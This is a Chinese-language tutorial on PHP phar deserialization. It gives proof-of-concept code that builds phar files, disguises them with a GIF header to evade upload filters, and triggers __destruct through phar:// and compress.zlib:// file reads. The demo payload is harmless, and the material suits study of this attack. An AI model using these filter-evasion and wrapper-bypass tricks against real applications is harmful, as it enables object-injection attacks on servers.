phar反序列化

phar相关基础

在PHP中，PHAR（PHP Archive）是一种用于打包和分发PHP应用程序的文件格式。PHAR文件实际上是一个归档文件，类似于ZIP或TAR文件，它可以包含PHP代码、类库、资源文件和其他相关文件。

PHAR文件可以被视为一个自包含的可执行文件，其中包含了应用程序所需的所有文件和依赖项。它具有许多优点，包括便于分发、部署和使用，以及保护代码不被修改或篡改。

使用PHAR文件，你可以将整个PHP应用程序打包为一个独立的可执行文件，而无需依赖于外部文件或目录结构。这使得应用程序更易于部署和分发，不需要用户手动配置环境或复制多个文件。

在PHP中，你可以使用PHAR扩展或相关的工具（如Box、PharBuilder等）来创建、打包和处理PHAR文件。也可以使用PHAR文件来构建自包含的命令行工具、Web应用程序、脚本和其他类型的PHP应用程序。

目录结构为：

  • a stub是一个文件标志，格式为 ：xxx<?php xxx;__HALT_COMPILER();?>。
  • manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。
  • contents是被压缩的内容。
  • signature签名，放在文件末尾。

下面用代码来实际生成一个phar文件来

<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

在nodepad++中打开可以看到设置的stub；还有后面的数据是序列化的形式来存储到压缩包中的。

将phar文件伪造成其他格式文件

在上面忘记说了，我们在构造phar文件时，必须以__HALT_COMPILER();?>来结尾，但文件头时任意构造的，所以我们可以添加任意文件头来伪造成其他格式文件。如下：

<?php
    class TestObject {
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o->data='hello L1n!';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

可以看到，压缩包被伪造了gif图片的文件头。通过这种方法，我们可以通过这种方法来绕过各种过滤。

触发反序列化的文件操作函数

要想要触发这个序列化的字符串，就必然需要反序列化来触发这个代码，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，据师傅博客讲的受影响的代码如下：

下面是同样以代码来展示效果，是用上面生成的phar文件来展示：

<?php 
    class TestObject {
        public function __destruct() {
            echo $this->data;
            echo 'Destruct called';

        }
    }

    $filename = 'phar://phar.phar/test.txt';
    file_get_contents($filename); 
?>

可以发现__destruct()被正常触发，输出了其中的字符串，若在题目中限制头部不允许phar出现，也可用Bzip与Gzip协议来绕过检测：

$filename = 'compress.zlib://phar://phar.phar/test.txt';

可以发现，虽然报错，但依旧执行，没啥影响
